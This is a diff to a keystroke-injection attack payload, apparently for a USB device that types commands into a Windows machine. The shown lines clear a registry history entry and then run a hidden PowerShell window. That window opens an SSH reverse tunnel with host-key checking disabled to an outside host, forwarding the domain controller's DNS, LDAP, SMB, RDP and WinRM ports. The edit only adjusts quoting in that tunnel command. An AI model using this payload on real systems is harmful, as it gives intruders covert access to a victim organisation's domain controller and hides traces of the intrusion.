@@ -12,7 +12,7 @@ STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\C
 ENTER
 DELAY 3000
 REM | in CMD prompt, use "%logonserver:~2%" to get plain DC server name. In powershell, use "$env:LOGONSERVER.substring(2)"
-STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:$env:LOGONSERVER.substring(2):53 -R 10080:$env:LOGONSERVER.substring(2):80 -R 10389:$env:LOGONSERVER.substring(2):389 -R 10445:$env:LOGONSERVER.substring(2):445 -R 13389:$env:LOGONSERVER.substring(2):3389 -R 15985:$env:LOGONSERVER.substring(2):5985 omg@192.168.200.224
+STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:"$env:LOGONSERVER.substring(2)":53 -R 10080:"$env:LOGONSERVER.substring(2)":80 -R 10389:"$env:LOGONSERVER.substring(2)":389 -R 10445:"$env:LOGONSERVER.substring(2)":445 -R 13389:"$env:LOGONSERVER.substring(2)":3389 -R 15985:"$env:LOGONSERVER.substring(2)":5985 omg@192.168.200.224
 ENTER
 DELAY 2000
 REM | Below is for password (TODO: change from "yes")
